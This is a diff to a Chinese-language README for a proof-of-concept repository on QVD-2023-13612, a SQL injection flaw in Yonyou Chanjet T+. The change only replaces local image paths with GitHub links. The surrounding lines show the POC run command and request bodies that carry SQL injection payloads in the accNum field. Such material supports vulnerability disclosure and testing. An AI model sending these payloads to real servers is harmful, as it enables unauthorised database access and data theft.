@@ -41,7 +41,7 @@ POC
  python '.\QVD-2023-13612_SQL Injection Vulnerability.py' -f .\url.txt -t 5 -o 1.txt
 ```
 
-![image-20230628003352114](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\5.png)
+![image-20230628003352114](https://github.com/Sweelg/QVD-2023-13612_TPlus-SQLvuln/raw/main/img/5.png)
 
 ### 数据包
 
@@ -58,7 +58,7 @@ Content-Length: 79
 {"accNum": "3'and (select @@version)>0--", "functionTag": "SYS0104", "url": ""}
 ```
 
-![](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\1.png)
+![](https://github.com/Sweelg/QVD-2023-13612_TPlus-SQLvuln/raw/main/img/1.png)
 
 ### EXP
 
@@ -82,9 +82,9 @@ Content-Length: 53
 {"accNum": "3'", "functionTag": "SYS0104", "url": ""}
 ```
 
-![image-20230627173340255](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\2.png)
+![image-20230627173340255](https://github.com/Sweelg/QVD-2023-13612_TPlus-SQLvuln/raw/main/img/2.png)
 
-![image-20230627225735364](D:\tools\GitHub-exp\QVD-2023-13612 用友畅捷通T SQL注入\img\3.png)
+![image-20230627225735364](https://github.com/Sweelg/QVD-2023-13612_TPlus-SQLvuln/raw/main/img/3.png)
 
 ## 免责声明
 
